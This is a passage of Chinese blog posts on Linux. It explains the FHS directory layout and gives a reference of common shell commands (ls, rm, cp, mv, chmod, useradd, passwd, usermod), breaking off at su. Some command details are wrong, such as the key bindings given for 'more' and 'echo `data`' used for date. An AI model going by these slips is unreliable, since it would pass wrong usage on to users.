    <content type="text"><![CDATA[根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的，同时根目录也与开机/还原/系统修复等动作有关。因此FHS标准建议： 根目录(/)所在分区应该越小越好，且应用程式所安装的软体最好不要与根目录放在同一个分区内，以保持根目录越小越好。 如此不但效能较佳，根目录所在的文件系统也较不容易发生问题。 说白了，就是根目录和Windows的C盘一个样 1.根目录下各个目录的功能 详细列表 目录 应放置档案内容 说明 备注 /binBinary 系统有很多放置执行档的目录，但/bin比较特殊。因为/bin放置的是在单人维护模式[quest-?]下还能够被操作的指令。在/bin底下的指令可以被root与一般帐号所使用，主要有：cat, chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。 存放普通用户可执行的指令 即使在单用户模式下也能够执行处理 /boot 主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。 Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在**/boot/grub/**这个目录！ 开机引导目录 包括Linux内核文件与开机所需要的文件 /devdevice 在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有/dev/null, /dev/zero, /dev/tty , /dev/lp*, / dev/hd*, /dev/sd*等等 设备目录 所有的硬件设备及周边均放置在这个设备目录中 /etcEditable Text Configuration 系统主要的设定档几乎都放置在这个目录内，例如人员的帐号密码档、各种服务的启始档等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有： /etc/inittab, /etc/init.d/, /etc/modprobe.conf, /etc/X11/, /etc/fstab, /etc/sysconfig/等等。 另外，其下重要的目录有： /etc/init.d/ ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话：『 /etc/init.d/iptables start』、『/etc/init.d/ iptables stop』 /etc/xinetd.d/ ：这就是所谓的super daemon管理的各项服务的设定档目录。 /etc/X11/ ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。 各种配置文件目录 大部分配置属性均存放在这里 /home 这是系统预设的使用者家目录(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录！ /liblibrary 系统的函式库非常的多，而/lib放置的则是在开机时会用到的函式库，以及在/bin或/sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？你可以将他想成是『外挂』，某些指令必须要有这些『外挂』才能够顺利完成程式的执行之意。 尤其重要的是/lib/modules/这个目录，因为该目录会放置核心相关的模组(驱动程式)喔！ 开机时常用的动态链接库 bin及sbin指令也会调用对应的lib库 /media media是『媒体』的英文，顾名思义，这个/media底下放置的就是可移除的装置啦！ 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。 可移除设备挂载目录 类似软盘 U盘 光盘等临时挂放目录 /mnt 如果妳想要暂时挂载某些额外的装置，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与/media相同啦！ 只是有了/media之后，这个目录就用来暂时挂载用了 用户临时挂载其他的文件系统 额外的设备可挂载在这里,相对临时而言 /opt 这个是给第三方协力软体放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在/usr/local目录下！ 第三方软件安装目录 现在习惯性的放置在/usr/local中 /root 系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。 系统管理员主目录 除root之外,其他用户均放置在/home目录下 /sbinSuper user Binary Linux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来『设定』系统，****其他****使用者最多只能用来『查询』而已。放在/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到/usr/sbin/当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到/usr/local/sbin/当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。 只有root才能运行的管理指令 跟bin类似,但只属于root管理员 /srv srv可以视为『service』的缩写，是一些网路服务启动之后，这些服务所需要取用的资料目录。 常见的服务例如WWW, FTP等等。 举例来说，WWW伺服器需要的网页资料就可以放置在/srv/www/里面。呵呵，看来平时我们编写的代码应该放到这里了。 服务启动后需要访问的数据目录 /tmp 这是让一般使用者或者是正在执行的程序暂时放置档案的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊！ 因为FHS甚至建议在开机时，应该要将/tmp下的资料都删除！ 存放临时文件目录 所有用户对该目录均可读写 /usrUnix System Resource ▩ /bin 目录存放系统用户使用的应用程序，所有用户可访问。例如：who，whoami，sudo，users，attr，clear，ssh，gcc，perl，Python等。▩ /sbin 目录存放超级用户使用的比较高级的管理程序和系统守护程序。例如：arp，arpd，adduser，useradd，addgroup，groupdel，chroot，chpasswd等。▩ /lib 目录存放应用程序的库或包文件。例如：Apache，gcc，Python 等程序的库文件。▩ /lib64 目录存放64位系统的程序和软件包的库文件。▩ /include 目录存放C程序的头文件即 .h 文件。▩ /share 目录存放共享数据。/usr/share/doc: 系统说明文件存放目录。/usr/share/man: 程序说明文件存放目录▩ /local 目录是第三方应用程序的安装位置，包括 bin，sbin，lib，lib64，etc，include等子目录。▩ /src 目录存放源代码，linux内核的源代码就放在/usr/src/linux里▩ /doc 目录存放 linux 文档。 系统应用程序存放目录，例如 ftp，telnet 等等。 varvariable data file ▩ /cache 目录是应用程序缓存目录。 ▩ /local 目录是专用于 /usr/local 下应用的可变数据▩ /opt 目录专用于 /opt 目录下的程序存储可变数据。▩ /lock 目录用于存放锁文件。▩ /log 目录 用于存放日志目录及文件。▩ /var/log/wtmp记录系统登录和注销日志，/var/log/message记录核心和系统程序的信息。▩ /run 目录存放运行中的进程相关数据，通常用于存储进程的 pid 文件。▩ /tmp 目录保存系统两次重启之间产生的临时数据。▩ /lib 目录存放系统正常运行时随时会改变的文件。▩ /spool 目录为应用程序数据池。▩ /mail 目录存放用户邮件文件。 建议单独分区，设置较大的磁盘空间 各目录详解 /etc 文件系统 /etc 目录包含各种系统配置文件，下面说明其中的一些。其他的你应该知道它们属于哪个程序，并阅读该程序的man页。许多网络配置文件也在 /etc 中。 /etc/rc 或 /etc/rc.d 或 /etc/rc?.d rc.d 是 runlevel control directory 的缩写。/etc/rc.d/rc0.d - rc6.d 各启动级别的启动脚本，这些文件夹下的 init 脚本都有一些特别的名字，命名都以S（start）、K（kill）或 D（disable）开头，后面跟一个数字。当init进入一个运行等级的时候，它会按照数字顺序运行所有以 K 开头的脚本并传入 stop 参数，除非对应的 init 脚本在前一个运行等级中没有启动。然后 init 按照数字顺序运行所有以 S 开头的脚本并传入 start 参数。任何以 D 开头的 init 脚本都会被忽略—这让你可以在指定的运行等级禁止一个脚本，或者你也可以仅仅移除全部符号链接。所以如果你有两个脚本，S01foo 和 S05bar， init 首先会运行 S01foo start，当它进入特定的运行等级后再执行 S05bar start。/etc/rc.d/rcS.d 单用户模式启动脚本。/etc/rc.d/rc.local 通常它是一个留给用户修改的shell脚本。一般会在init进程结束的时候运行它，所以你可以在这里放一些想要运行的额外脚本，而不用再创建自己的init脚本。/etc/rc.d/rc.sysinit 文件主要做在各个运行模式中相同的初始化工作，包括设定 PATH、设定网络配置（/etc/sysconfig/network）、启动 swap 分区、设定 /proc 等等。/etc/rc.d/rc 文件当运行级别改变时，负责启动/停止各种服务。 /etc/init 或 /etc/init.d init 文件夹包含所有服务在各个运行等级中的全部启动脚本。一般来说，它们都是标准的 shell 脚本，遵守最基本的标准。每个脚本最少接受两个参数 start 和 stop，它们分别代表启动和停止服务 （如网页服务）。除此之外，init脚本通常还会接受一些额外的选项，如 restart（重启服务器）、status（返回服务当前状态）、reload（告知服务从配置文件中重新载入配置）以及 force-reload（强制服务重载它的配置）。当用不带参数的方式运行脚本的时候，一般应该返回一个它会接受的参数列表。 init.d 目录存放的是一些脚本，一般是 linux 以 rpm 包安装时设定的一些服务的启动脚本。系统在安装时装了好多rpm 包，这里面就有很多对应的脚本。执行这些脚本可以用来启动，停止，重启这些服务。前面说到，init.d 这个目录下的脚本就类似与 windows 中的注册表，在系统启动的时候执行。 /etc/inittab init 进程的配置文件。 /etc/passwd 用户数据库，其中的域给出了用户名、真实姓名、用户起始目录、加密口令和用户的其 他信息。 /etc/fdprm 软盘参数表，用以说明不同的软盘格式。可用 setfdprm 进行设置。 /etc/fstab 指定启动时需要自动安装的文件系统列表。启动时 mount -a 命令(在 /etc/rc 或等效的启动文件中)自动 mount 的文件系统列表也包括用 swapon -a 启用的 swap 区的信息。 /etc/group、/etc/adduser.conf、/etc/deluser.conf、/etc/sudoers 类似 /etc/passwd ，但说明的不是用户信息而是组的信息。包括组的各种数据。 添加的用户信息，删除用户信息。 具有sodu执行权限的用户信息。 /etc/issue 包括用户在登录提示符前的输出信息。通常包括系统的一段短说明或欢迎信息。具体内容由系统管理员确定。 /etc/magic “file” 的配置文件。包含不同文件格式的说明，“file” 基于它猜测文件类型。 /etc/motd motd 是 message of the day 的缩写，用户成功登录后自动输出。内容由系统管理员确定。常用于通告信息，如计划关机时间的警告等。 /etc/mtab 当前安装的文件系统列表。由脚本( scritp )初始化，并由 mount 命令自动更新。当需要一个当前安装的文件系统的列表时使用(例如 df 命令)。 /etc/shadow 在安装了影子( shadow )口令软件的系统上的影子口令文件。影子口令文件将 /etc/passwd 文件中的加密口令移动到 /etc/shadow 中，而后者只对超级用户( root )可读。这使破译口令更困难，以此增加系统的安全性。 /etc/login.defs login 命令的配置文件。 /etc/printcap 类似 /etc/termcap ，但针对打印机。语法不同。 /etc/profile 、/etc/csh.login、/etc/csh.cshrc /etc/profile 系统全局环境变量设置，里面可以添加对所有用户有效的环境变量，系统配置等。 登录或启动时 bourne 或 c shells执行的文件。这允许系统管理员为所有用户建立全局缺省环境。 /etc/securetty 确认安全终端，即哪个终端允许超级用户( root )登录。一般只列出虚拟控制台，这样就不可能(至少很困难)通过调制解调器( modem )或网络闯入系统并得到超级用户特权。 /etc/shells 列出可以使用的 shell。chsh 命令允许用户在本文件指定范围内改变登录的 shell。提供一台机器 ftp 服务的服务进程 ftpd 检查用户 shell 是否列在 /etc/shells 文件中，如果不是，将不允许该用户登录。 /etc/termcap 终端性能数据库。说明不同的终端用什么“转义序列”控制。写程序时不直接输出转义序列(这样只能工作于特定品牌的终端)，而是从 /etc/termcap 中查找要做的工作的正确序列。这样，多数的程序可以在多数终端上运行。 /etc/bash.bashrc bash 的环境变量配置，里面添加启动bash时读取的环境。 /etc/hosts 主机域名的配置。 /etc/ld.so.cof ldconfig命令读取的系统库目录配置文件。/etc/ld.so.cache ldconfig命令读取的系统库路径生成的缓存文件。 /etc/sysctl.conf 系统内核的配置文件。 /etc/protocols 系统支持的ip协议簇。 /etc/timezone 系统的时间时区设置。 /usr 文件系统 /usr 是个很重要的目录，通常这一文件系统很大，因为所有程序安装在这里。/usr 里的所有文件一般来自 linux 发行版( distribution)；本地安装的程序和其他东西在 /usr/local 下，因为这样可以在升级新版系统或新发行版时无须重新安装全部程序。/usr 目录下的许多内容是可选的，但这些功能会使用户使用系统更加有效。/usr 可容纳许多大型的软件包和它们的配置文件。下面列出一些重要的目录(一些不太重要的目录被省略了)。 /usr/x11r6 包含 x window 系统的所有可执行程序、配置文件和支持文件，之所以取名为 X11R6 是因为最后的X版本为第11版，且该版的第6次释出之意。为简化 x 的开发和安装，x 的文件没有集成到系统中。x window 系统是一个功能强大的图形环境，提供了大量的图形工具程序。用户如果对 microsoft windows 或 machintosh 比较熟悉的话，就不会对 xwindow 系统感到束手无策了。 /usr/x386 类似 /usr/x11r6，但是是专门给 x 11 release 5 的。 /usr/bin 集中了几乎所有用户命令，是系统的软件库。另有些命令在 /bin 或 /usr/local/bin 中。 /usr/sbin 包括了根文件系统不必要的系统管理命令，例如多数服务程序。 /usr/man、/usr/info、/usr/doc 这些目录包含所有手册页、gnu 信息文档和各种其他文档文件。每个联机手册的“节”都有两个子目录。例如：/usr/man/man1 中包含联机手册第一节的源码(没有格式化的原始文件)，/usr/man/cat1 包含第一节已格式化的内容。联机手册分为以下九节：内部命令、系统调用、库函数、设备、文件格式、游戏、宏软件包、系统管理和核心程序。 /usr/include 包含了 c 语言的头文件，这些文件多以 . h 结尾，用来描述 c 语言程序中用到的数据结构、子过程和常量。为了保持一致性，这实际上应该放在 /usr/lib 下，但习惯上一直沿用了这个名字。 /usr/lib lib 是 library 的简写。存放的是各应用软件的动态链接库以及一些不被一般使用者惯用的执行档或脚本(script)。编程的原始库也存在 /usr/lib 里。当编译程序时，程序便会和其中的库进行连接。也有许多程序把配置文件存入其中。 /usr/local 系统管理员在本机安装下载的软件(非 distribution 默认提供者)，建议安装到此目录， 这样会比较便于管理。举例来说，你的 distribution 提供的软件较旧，你想安装较新的软件但又不想移除旧版， 此时你可以将新版软件安装于 /usr/local/ 目录下，可与原先的旧版软件有分别啦。 你可以自行到 /usr/local 去看看，该目录下也是具有 bin, etc, include, lib…的次目录。 /usr/share 放置共享文件的地方，在这个目录下放置的数据几乎是不分硬件架构均可读取的数据， 因为几乎都是文本文件。在此目录下常见的还有这些次目录：/usr/share/man：联机帮助文件；/usr/share/doc：软件杂项的文件说明；/usr/share/zoneinfo：与时区有关的时区文件。 /usr/src src 是 source 的缩写，一般原始码建议放置到这里。至于核心原始码则建议放置到 /usr/src/linux/ 目录下。 /var 文件系统 /var 包含系统一般运行时要改变的数据。通常这些数据所在的目录的大小是要经常变化或扩充的。原来 /var 目录中有些内容是在 /usr 中的，但为了保持 /usr 目录的相对稳定，就把那些需要经常改变的目录放到 /var 中了。每个系统是特定的，即不通过网络与其他计算机共享。下面列出一些重要的目录(一些不太重要的目录省略了)。 /var/catman 包括了格式化过的帮助( man )页。帮助页的源文件一般存在 /usr/man/man 中；有些 man 页可能有预格式化的版本，存在 /usr/man/cat 中。而其他的 man 页在第一次看时都需要格式化，格式化完的版本存在 /var/man 中，这样其他人再看相同的页时就无须等待格式化了。( /var/catman 经常被清除，就像清除临时目录一样。) /var/lib 程序执行的过程中，需要使用到的数据文件放置的目录。在此目录下各自的软件应该要有各自的目录。 举例来说，MySQL 的数据库放置到 /var/lib/mysql/ 而 rpm 的数据库则放到 /var/lib/rpm 中。 /var/local 存放 /usr/local 中安装的程序的可变数据（即系统管理员安装的程序）。注意，如果必要，即使本地安装的程序也会使用其他 /var 目录，例如 /var/lock 。 /var/lock 锁文件。许多程序遵循在 /var/lock 中产生一个锁定文件的约定，以用来支持他们正在使用某个特定的设备或文件。其他程序注意到这个锁定文件时，就不会再使用这个设备或文件。 /var/log 各种程序的日志( log )文件，尤其是 login（ /var/log/wtmp log纪录所有到系统的登录和注销） 和 syslog （ /var/log/messages 纪录存储所有核心和系统程序信息）。/var/log 里的文件经常不确定地增长，应该定期清除。 /var/run 保存在下一次系统引导前有效的关于系统的信息文件。例如， /var/run/utmp 包含当前登录的用户的信息。某些程序或者是服务启动后，会将他们的PID放置在这个目录下。 /var/spool 放置“假脱机( spool )”程序的目录，如mail、news、打印队列和其他队列工作的目录。每个不同的 spool 在 /var/spool 下有自己的子目录，例如，用户的邮箱就存放在 /var/spool/mail 中。 /var/tmp 比 /tmp 允许更大的或需要存在较长时间的临时文件。注意系统管理员可能不允许 /var/tmp 有很旧的文件。 /var/cache 应用程序运行过程中会产生的一些暂存档。 2.根目录下的结构 tree 命令 使用tree 可以查看详细的目录树 根目录下的结构图 注意 /etc：设定档 /bin：重要执行档 /dev：所需要的装置档案 /lib：执行档所需的函式库与核心所需的模组 /sbin：重要的系统执行档 这五个目录千万不可与根目录分开在不同的分区！]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>知识库</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux常用命令总结（二进制）]]></title>
    <url>%2F2020%2F03%2F20%2F2020.03.20%EF%BC%88104%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 目录操作命令 0x00 ls（list） 功能：列举出当前工作目录的内容，包括文件和文件夹 相关选项： ls -l： 文件/文件夹：长格式显示指定/目录中的文件 123456789root@# ls -l 图片1.png-rwxrwxrwx 1 root root 43531 Mar 16 13:02 图片1.png 权限位 引用计数 所有者 属组 大小 最后一次修改时间 文件名 root@# ls -l 文件夹-rwxrwxrwx 1 root root 645653 Mar 18 10:25 5d0b02281396a.png-rwxrwxrwx 1 root root 1139867 Feb 23 12:09 IMG_1074.jpg-rwxrwxrwx 1 root root 2282681 Feb 14 15:54 IMG_1093-2.jpg 权限位 引用计数 所有者 属组 大小 最后一次修改时间 文件名 ls -a：显示所有文件，包含隐藏文件 0x01 cd（Change Directory） 作用：切换文件路径，cd 将给定的文件夹（或目录）设置成当前工作目录 功能： cd ~：进入当前用户的home目录 cd -：进入上次目录 cd .. ：进入上一级目录 0x02 pwd（print working directory） 功能：显示当前工作目录 12root@:/mnt/d/Program# pwd/mnt/d/Program 相关选项：无 附加知识点：Linux 常见目录及作用 1234567891011121314151617181920212223242526272829303132333435363738394041/ 根目录/bin 命令保存目录（普通用户就可以读取的命令）/boot 启动目录，启动相关文件/dev 设备文件保存目录/etc 配置文件保存目录/home 普通用户的家目录/lib 系统库保存目录/mnt 系统挂载目录/media 挂载目录/root 超级用户的家目录/tmp 临时目录/sbin 命令保存目录（超级用户才能使用的目录）/proc 直接写入内存的/sys 将内核的一些信息映射，可供应用程序所用/usr 系统软件资源目录/usr/bin/ 系统命令（普通用户）/usr/sbin/ 系统命令（超级用户）/var 系统相关文档内容/var/log/ 系统日志位置/var/spool/mail/ 系统默认邮箱位置/var/lib/ 默认安装的库文件目录 0x03 mkdir（make directories） 功能：用于新建一个新目录 相关选项： mkdir test：创建名为test的目录 mkdir -p test1/test2/test3：递归创建 0x04 rmdir（remove directories） 功能：删除给定的目录（只能删除空目录） 相关选项： 0x05 echo 功能：用于字符串的输出。 相关命令/选项： 显示普通字符：echo &quot;Hello World&quot;(双引号可以省略)，输出Hello World 显示转义字符：echo &quot;\&quot;Hello World\&quot;&quot; 输出&quot;Hello World&quot; 显示变量： 123&gt; read name`&gt; echo &quot;$name It is my name&quot;&gt; 以上代码保存为 test.sh，name 接收标准输入的变量，输入为Liming，结果将是: 1234&gt; # sh test.sh &gt; Liming &gt; Liming HHH&gt; 显示换行： 123&gt; echo -e &quot;OK! \n&quot; # -e 开启转义&gt; echo &quot;It is a test&quot;&gt; 输出结果： 1234&gt; OK!&gt; &gt; It is a test&gt; \a 发出警告声； \b 删除前一个字符； \c 最后不加上换行符号； \f 换行但光标仍旧停留在原来的位置； \n 换行且光标移至行首； \r 光标移至行首，但不换行； \t 插入tab； \v 与\f相同； \\ 插入\字符； \nnn 插入nnn（八进制）所代表的ASCII字符； 显示结果定向至文件：echo &quot;It is a test&quot; &gt; myfile（要注意&gt;和&gt;&gt;的区别，前者是覆盖，后者是在后面追加） 显示命令执行结果：echo `data` 0x01 文件操作命令 0x00 touch（touch） 功能：创建空文件或修改文件时间 例子 touch test.py：创建空文件，如果文件存在，则修改文件创建时间 0x01 rm（remove） 功能：删除给定的文件 相关选项： rm -r 目录名： 递归删除文件和目录 rm -r *：删除当前目录下的所有文件及目录 rm -f 文件名 ： 强制删除 rm -rf 目录名: 强制删除目录和文件 0x02 cat（concatenate and print files） 功能：用于在标准输出（监控器或屏幕）上查看文件内容 相关选项： -n：由 1 开始对所有输出的行数编号 -b：和 -n 相似，只不过对于空白行不编号 -E： 在每行结束处显示 $ 0x03 more 功能：命令类似 cat ，不过会以一页一页的形式显示 相关选项： 空格键：向上翻页 b：向下翻页 p：退出查看 0x04 cp（copy） 功能：对文件或目录进行复制 相关选项： cp 源文件 目标位置 (复制) cp 源文件 目标位置/目标名称 (复制并改名) cp -r test/ newtest ：复制目录 cp -p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中 cp -d：若源文件是链接文件，则复制链接属性 cp -a：相当于 cp -pdr 0x05 mv（move） 功能：命令对文件或文件夹进行移动，如果文件或文件夹存在于当前工作目录，还可以对文件或文件夹进行重命名 命令格式 运行结果 mv 文件名 文件名 将源文件名改为目标文件名 mv 文件名 目录名 将文件移动到目标目录 mv 目录名 目录名 目标目录已存在，将源目录移动到目标目录；目标目录不存在则改名 mv 目录名 文件名 出错 相关选项： mv -i：若指定目录已有同名文件，则先询问是否覆盖旧文件; mv -f：在 mv 操作要覆盖某已有的目标文件时不给任何指示; 实例 目标目录与原目录一致，指定了新文件名，效果就是仅仅重命名： 1mv /home/ffxhd/a.txt /home/ffxhd/b.txt 目标目录与原目录不一致，没有指定新文件名，效果就是仅仅移动 123mv /home/ffxhd/a.txt /home/ffxhd/test/ 或者mv /home/ffxhd/a.txt /home/ffxhd/test 目标目录与原目录不一致, 指定了新文件名，效果就是：移动 + 重命名 1mv /home/ffxhd/a.txt /home/ffxhd/test/c.txt 0x06 cat（Catenate，连锁） 功能：用于连接文件并打印到标准输出设备上 相关选项： -n：由 1 开始对所有输出的行数编号 -b：和 -n 相似，只不过对于空白行不编号 -s：当遇到有连续两行以上的空白行，就代换为一行的空白行 -E 或 --show-ends : 在每行结束处显示 $。 相关实例 把 textfile1 的文档内容加上行号后输入 textfile2 这个文档里： 1cat -n textfile1 &gt; textfile2 把 textfile1 和 textfile2 的文档内容加上行号（空白行不加）之后将内容附加到 textfile3 文档里： 1cat -b textfile1 textfile2 &gt;&gt; textfile3 抓取文件中感兴趣的关键字： 1cat 文件 | grep 关键字 cat创建文件： 123456法一：cat &gt; 文件名 &lt;&lt;结束标记如果文件名已经存在，那么上述的命令格式会覆盖原来文件中的内容，要想不覆盖则用下面的：cat &gt;&gt; 文件名 &lt;&lt;结束标记=====================================法二：仅用cat &gt; 文件名，然后Ctrl + C退出bash 这篇可以看一下Linux cat命令使用 0x07 xxd命令 功能：将一个给定文件或标准输入转换为十六进制形式，也能将十六进制转换回二进制形式 相关选项： a : 它的作用是自动跳过空白内容，默认是关闭的 c : 它的后面加上数字表示每行显示多少字节的十六进制数，默认是16字节 g : 设定以几个字节为一块，默认为2字节 l : 显示多少字节的内容 s : 后面接【±】和address.加号表示从地址处开始的内容，减号表示距末尾address开始的内容 具体用法： 12345678910111213141516xxd -a -c 12 -g 1 -l 512 -s +0x2600 [inputfile] 【自动跳过空白】【每行显示12字节】【一个字节一块】【显示512字节内容】【从0x2600开始】 【输入文件】 #root:~$xxd -a -c 12 -g 1 -l 512 -s +0x2600 ~/桌面/i/a.img0002600: 41 6c 00 6f 00 61 00 64 00 65 00 0f | Al.o.a.d.e000260c: 00 ab 72 00 2e 00 62 00 69 00 6e 00 | r…b.i.n.0002618: 00 00 00 00 ff ff ff ff 4c 4f 41 44 | ……LOAD0002624: 45 52 20 20 42 49 4e 20 00 64 94 8e | ER BIN .d0002630: 78 3a 78 3a 00 00 94 8e 78 3a 03 00 | x:x:…x:000263c: 51 16 00 00 41 6b 00 65 00 72 00 6e | Q…Ak.e.r.n 0x08 ln 功能：Linux ln命令是一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。链接分为硬链接和软链接，其中： 硬链接的意思是一个档案可以有多个名称，它是存在同一个文件系统中 1.硬链接，以文件副本的形式存在。但不占用实际空间。 2.不允许给目录创建硬链接 3.硬链接只有在同一个文件系统中才能创建 软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置，而软链接却可以跨越不同的文件系统。 1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式 2.软链接可以跨文件系统 ，硬链接不可以 3.软链接可以对一个不存在的文件名进行链接 4.软链接可以对目录进行链接 语法：ln [参数][源文件或目录][目标文件或目录] 命令参数： -b 删除，覆盖以前建立的链接 -d 允许超级用户制作目录的硬链接 -f 强制执行 -i 交互模式，文件存在则提示用户是否覆盖 -n 把符号链接视为一般目录 -s 软链接(符号链接) -v 显示详细的处理过程 示例： 给文件创建软链接，为log2013.log文件创建软链接link2013，如果log2013.log丢失，link2013将失效： 1ln -s log2013.log link2013 给文件创建硬链接，为log2013.log创建硬链接ln2013，log2013.log与ln2013的各项属性相同 1ln log2013.log ln2013 0x02 权限管理 有关权限位请看我的另一篇博客：linux的权限位，这里就再简单的介绍一下： 权限位： 12-rwxrwxrwx 1 root root 43531 Mar 16 13:02 图片1.png 权限位 引用计数 所有者 属组 大小 最后一次修改时间 文件名 权限位的个数：权限位是十位 第一位：代表文件类型 ▧ -：普通文件 ▧ d：目录文件 ▧ l：链接文件 其他九位：代表各用户的权限 ▧ 前三位：属主权限u ▧ 中间三位：属组权限g ▧ 后三位：其他人权限o r、w、x： r 表示文件可读，用数字 4 来代表 w 表示文件可写，用数字 2 来代表 x 表示文件可执行，用数字 1 来代表 权限意义： ⇲ 权限对文件的含义： ▧ r：读取文件内容 如：cat、more、head、tail ▧ w：编辑、新增、修改文件内容 如：vi、echo 但是不包含删除文件 ▧ x：可执行 /tmp/11/22/abc ⇲ 权限对目录的含义： ▧ r：可以查询目录下文件名 如：ls ▧ w：具有修改目录结构的权限 如：touch、rm、mv、cp ▧ x：可以进入目录 如：cd 0x00 chmod（change the permissions mode of a file） 功能：修改权限 相关选项： 1[ugoa...][[+-=][rwxX]...][,...] 其中： ▧ u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是 ▧ + 表示增加权限、- 表示取消权限、= 表示唯一设定权限 ▧ r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行 其他参数说明： ▧ -v : 显示权限变更的详细资料 ▧ -R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递回的方式逐个变更) 实例： 将文件 file1.txt 设为所有人皆可读取 ： 1chmod ugo+r file1.txt 将文件 file1.txt 设为所有人皆可读取 : 1chmod a+r file1.txt 将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 : 1chmod ug+w,o-w file1.txt file2.txt 将 ex1.py 设定为只有该文件拥有者可以执行 : 1chmod u+x ex1.py 将目前目录下的所有文件与子目录皆设为任何人可读取 : 1chmod -R a+r * 此外chmod也可以用数字来表示权限如 : 1chmod 777 file 语法为： 1chmod abc file 其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。 r=4，w=2，x=1 若要rwx属性则4+2+1=7； 若要rw-属性则4+2=6； 若要r-x属性则4+1=5。 1chmod a=rwx file 和 1chmod 777 file 效果相同 1chmod ug=rwx,o=x file 和 1chmod 771 file 0x01 useradd 功能：建立用户帐号 命令格式： 1useradd -D [-b][-e &lt;有效期限&gt;][-f &lt;缓冲天数&gt;][-g &lt;群组&gt;][-G &lt;群组&gt;][-s &lt;shell&gt;] 参数说明： -c &lt;备注&gt;：加上备注文字。备注文字会保存在passwd的备注栏位中。 -d &lt;登入目录&gt;：指定用户登入时的起始目录。 -D：变更预设值． -e &lt;有效期限&gt;：指定帐号的有效期限。 -f &lt;缓冲天数&gt;：指定在密码过期后多少天即关闭该帐号。 -g &lt;群组&gt;： 指定用户所属的群组。 -G &lt;群组&gt;： 指定用户所属的附加群组。 -m：自动建立用户的登入目录。 -M：不要自动建立用户的登入目录。 -n：取消建立以用户名称为名的群组． -r：建立系统帐号。 -s&lt;shell&gt;：指定用户登入后所使用的shell。 -u&lt;uid&gt;：指定用户ID。 实例 添加一般用户 1# useradd tt 为添加的用户指定相应的用户组 1# useradd -g root tt 创建一个系统用户 1# useradd -r tt 为新添加的用户指定home目录 1# useradd -d /home/myd tt 建立用户且制定ID 1# useradd caojh -u 544 0x02 passwd 功能：用来更改使用者的密码 语法： 1passwd [-k] [-l] [-u [-f]] [-d] [-S] [username] 参数 -d 删除密码 -f 强迫用户下次登录时必须修改口令 -w 口令要到期提前警告的天数 -k 更新只能发送在过期之后 -l 停止账号使用 -S 显示密码信息 -u 启用已被停止的账户 -x 指定口令最长存活期 -g 修改群组密码 指定口令最短存活期 -i 口令过期后多少天停用账户 –help 显示帮助信息 –version 显示版本信息 0x03 usermod 功能：用于修改用户帐号，可用来修改用户帐号的各项设定。 语法： 1usermod [-LU][-c &lt;备注&gt;][-d &lt;登入目录&gt;][-e &lt;有效期限&gt;][-f &lt;缓冲天数&gt;][-g &lt;群组&gt;][-G &lt;群组&gt;][-l &lt;帐号名称&gt;][-s &lt;shell&gt;][-u &lt;uid&gt;][用户帐号] 参数说明： -c&lt;备注&gt; 修改用户帐号的备注文字。 -d登入目录&gt; 修改用户登入时的目录。 -e&lt;有效期限&gt; 修改帐号的有效期限。 -f&lt;缓冲天数&gt; 修改在密码过期后多少天即关闭该帐号。 -g&lt;群组&gt; 修改用户所属的群组。 -G&lt;群组&gt; 修改用户所属的附加群组。 -l&lt;帐号名称&gt; 修改用户帐号名称。 -L 锁定用户密码，使密码无效。 -s 修改用户登入后所使用的shell。 -u 修改用户ID。 -U 解除密码锁定。 实例 更改登录目录 1# usermod -d /home/hnlinux root 改变用户的uid 1# usermod -u 777 root 指定shell 1# usermod -s /bin/bash username 综合 Linux 使用 adduser 与 useradd 添加普通用户的正确姿势 0x04 su 功能：用于变更为其他使用者的身份，除 root 